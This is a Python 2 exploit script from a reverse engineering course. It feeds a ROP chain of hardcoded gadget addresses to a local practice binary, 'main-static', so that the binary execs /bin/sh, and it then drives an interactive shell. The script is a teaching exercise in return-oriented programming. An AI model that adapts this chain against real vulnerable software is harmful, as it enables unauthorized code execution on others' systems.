#!/usr/bin/python

#
# Reverse Engineering course
# Author: martin.uy/reverse
# License: Creative Commons Attribution-ShareAlike (CC-BY-SA)
#

import sys
import pexpect
import re
import struct

def main():
    ptarget = pexpect.spawn("./main-static", ['env'], env={})
    ptarget.expect("\n")
    ptr_buff = int(ptarget.before, 16)
    print "Buff: "+ hex(ptr_buff)

    payload_offset = "0000"
    pop_ebp_gadget = "0804844E"
    xchg_ebp_eax_gadget = "080F73E9"
    xchg_ecx_eax_gadget = "080E03A3"
    xchg_ecx_eax_gadget_ebp_balance = "ac300a25"
    xchg_edx_eax_gadget = "080D3649"
    pop_ebx_gadget = "080D3AFB"
    int_80_gadget = "0805EDF5"
    
    eax_final_value = "0000000b"
    ebx_final_value = hex(ptr_buff + 66).replace("0x", "")
    ecx_final_value = "00000000"
    edx_final_value = "00000000"

    payload = payload_offset + reverse_byte_string(pop_ebp_gadget) + reverse_byte_string(ecx_final_value) + reverse_byte_string(xchg_ebp_eax_gadget) + reverse_byte_string(pop_ebp_gadget) +  reverse_byte_string(xchg_ecx_eax_gadget_ebp_balance) + reverse_byte_string(xchg_ecx_eax_gadget) + reverse_byte_string(pop_ebp_gadget) + reverse_byte_string(edx_final_value) + reverse_byte_string(xchg_ebp_eax_gadget) + reverse_byte_string(xchg_edx_eax_gadget) + reverse_byte_string(pop_ebp_gadget) + reverse_byte_string(eax_final_value) + reverse_byte_string(xchg_ebp_eax_gadget) + reverse_byte_string(pop_ebx_gadget) + reverse_byte_string(ebx_final_value) + reverse_byte_string(int_80_gadget) + string_to_hex_string("/bin/sh") + "00"

    print "payload: " + payload
    print "paload len (bytes): " + str(len(payload)/2)

    ptarget.sendline(payload)

    ptarget.expect("$")
    print ptarget.read_nonblocking(size=1024, timeout=5)
    while True:
        try:
            command = raw_input("$: ")
            ptarget.sendline(command)
            ptarget.expect("$")
            ptarget.sendline("")
            print ptarget.read_nonblocking(size=1024, timeout=5)
            if command == "exit":
                print "Closing shell"
                ptarget.terminate()
                break
        except:
            pass

def string_to_hex_string(string):
    hex_string = ""
    for i in string:
        hex_string += hex(ord(i)).replace("0x", "")
    return hex_string

def reverse_byte_string(byte_string):
    reversed_byte_string = ""
    for i in range(0, len(byte_string)):
        if (i % 2) == 0:
            reversed_byte_string = byte_string[i] + byte_string[i+1] + reversed_byte_string
    return reversed_byte_string

if __name__ == "__main__":
    main()
